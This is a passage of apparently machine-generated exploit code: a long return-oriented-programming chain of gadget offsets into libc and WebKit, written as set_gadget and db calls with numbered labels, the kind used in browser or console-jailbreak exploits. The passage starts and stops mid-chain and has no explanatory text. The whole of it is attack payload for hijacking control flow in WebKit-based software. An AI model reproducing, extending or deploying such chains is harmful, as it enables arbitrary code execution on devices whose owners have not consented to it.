//L1686:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L1685:
db([0, 0]); // 0x0
//___sputc:
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+130552, //L1688
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
webkit_base+1420514 //pop r8
]);
//L1688:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+130640, //L1689
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+130672, //L1691
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L1689:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1690:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1691:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1692:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+130784, //L1694
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+130768, //L1693
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1693:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1694:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+130880, //L1696
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1695:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1696:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+130984, //L1699
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+130968, //L1698
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1698:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1699:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+131112, //L1702
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+131144, //L1704
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+131128, //L1703
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L1701:
db([12, 0]); // 0xc
set_gadget(libc_base+772328,); //pop rcx
//L1702:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1703:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1704:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+131248, //L1706
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+131232, //L1705
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1705:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1706:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+131408, //L1709
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+131440, //L1711
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+131392, //L1708
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+131424, //L1710
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1708:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1709:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1710:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1711:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+131552, //L1714
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+131536, //L1713
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L1712:
db([4294967295, 4294967295]); // -0x1
set_gadget(libc_base+165442,); //pop rdi
//L1713:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1714:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+131656, //L1716
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1715:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1716:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+131760, //L1719
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+131744, //L1718
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1718:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1719:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+131848, //L1721
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+131864, //L1722
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
//L1721:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1722:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+131936, //L1725
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
//L1724:
db([12, 0]); // 0xc
set_gadget(libc_base+772328,); //pop rcx
//L1725:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+972324, //mov [rax], ecx
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+132088, //L1727
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+132120, //L1729
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+132104, //L1728
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1727:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1728:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1729:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+132232, //L1730
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+132264, //L1732
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+132248, //L1731
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1730:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1731:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1732:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+8949069, //setle al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+132424, //L1733
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+132456, //L1735
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+132440, //L1734
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1733:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1734:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1735:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+132616, //L1740
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+132632, //L1741
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+132584, //L1738
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1737:
db([1, 0]); // 0x1
set_gadget(libc_base+165442,); //pop rdi
//L1738:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
//L1739:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1740:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1741:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+350006, //setne al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+132752, //L1742+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+132744, //L1742
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L1742:
db([0, 0]); // 0x0
set_gadgets([
ropchain+132768, //L1742+24
ropchain+137032, //L1736
libc_base+713278, //pop rsi
ropchain+132824, //L1744
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1743:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1744:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+132928, //L1747
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+132912, //L1746
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1746:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1747:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+133056, //L1750
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+133088, //L1752
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+133072, //L1751
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L1749:
db([36, 0]); // 0x24
set_gadget(libc_base+772328,); //pop rcx
//L1750:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1751:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1752:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+133192, //L1754
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+133176, //L1753
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1753:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+133352, //L1757
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+133384, //L1759
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+133336, //L1756
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+133368, //L1758
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1756:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1757:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1758:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1759:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+133464, //L1760
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+133480, //L1761
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1760:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1761:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+133576, //L1763
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+133560, //L1762
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1762:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1763:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+133672, //L1765
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1764:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L1765:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+133776, //L1768
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+133760, //L1767
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1767:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1768:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+133904, //L1771
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+133936, //L1773
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+133920, //L1772
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+713278 //pop rsi
]);
//L1770:
db([12, 0]); // 0xc
set_gadget(libc_base+772328,); //pop rcx
//L1771:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1772:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1773:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+134040, //L1775
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+134024, //L1774
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1774:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+134200, //L1778
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+134232, //L1780
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+134184, //L1777
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+134216, //L1779
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1777:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1778:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1779:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1780:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+134312, //L1781
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+134328, //L1782
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1781:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+134440, //L1783
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+134472, //L1785
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+134456, //L1784
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1783:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1784:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1785:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
webkit_base+8949069, //setle al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+134632, //L1786
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+134664, //L1788
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+134648, //L1787
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1786:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+134824, //L1793
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+134840, //L1794
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+134792, //L1791
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1790:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1791:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
//L1792:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11809960, //cmp rax, rsi ; sete al
libc_base+232261, //movzx eax, al
webkit_base+426067, //shl rax, 3
libc_base+713278, //pop rsi
ropchain+134952, //L1795+8
libc_base+507828, //add rax, rsi
libc_base+145226, //mov rax, [rax]
libc_base+713278, //pop rsi
ropchain+134944, //L1795
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+489696 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+134968, //L1795+24
ropchain+136656, //L1789
libc_base+713278, //pop rsi
ropchain+135024, //L1797
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L1796:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L1797:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+135128, //L1800
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+135112, //L1799
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L1799:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+135288, //L1803
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+135320, //L1805
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+135272, //L1802
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+135304, //L1804
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1803:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+135400, //L1806
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+135416, //L1807
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+135576, //L1811
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+135544, //L1809
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+135560, //L1810
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1808:
db([24, 0]); // 0x18
set_gadget(libc_base+165442,); //pop rdi
//L1809:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1810:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+857161, //shl rax, cl
libc_base+713278, //pop rsi
ropchain+135632, //L1812
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+165442 //pop rdi
]);
//L1812:
db([0, 0]); // 0x0
set_gadgets([
libc_base+288783, //sar edi, cl
libc_base+713278, //pop rsi
ropchain+135760, //L1815
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+135776, //L1816
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+135744, //L1814
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1814:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+135856, //L1817
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+135872, //L1818
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+135968, //L1820
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+135952, //L1819
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+136080, //L1823
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L1821:
db([10, 0]); // 0xa
set_gadget(libc_base+165442,); //pop rdi
//L1822:
db([10, 0]); // 0xa
set_gadget(webkit_base+3789839,); //pop r11
//L1823:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+136192, //L1824
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+136224, //L1826
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+136208, //L1825
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
webkit_base+15055763, //cmp rax, rcx ; sete al
libc_base+350006, //setne al
libc_base+232261, //movzx eax, al
libc_base+713278, //pop rsi
ropchain+136384, //L1827
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+136416, //L1829
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+136400, //L1828
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L1827:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
